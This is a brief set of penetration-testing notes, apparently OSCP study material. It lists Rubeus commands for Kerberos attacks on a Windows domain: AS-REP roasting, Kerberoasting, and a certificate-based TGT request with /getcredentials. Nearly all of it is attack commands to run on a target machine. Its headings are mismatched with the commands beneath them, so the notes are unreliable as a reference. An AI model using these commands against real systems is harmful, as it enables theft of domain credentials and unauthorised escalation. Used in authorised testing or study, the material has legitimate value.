
1. Put on target windows device

```c
.\rubeus.exe asreproast
```
![[Pasted image 20231113194001.png]]

##### Overpass the Hash

```c
.\Rubeus.exe kerberoast /user:<USERNAME>
```

##### [](https://github.com/0xsyr0/OSCP#pass-the-hash)Pass the Hash

```c
.\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
```
#### Kerberoast
```c
.\Rubeus.exe kerberoast /nowrap
```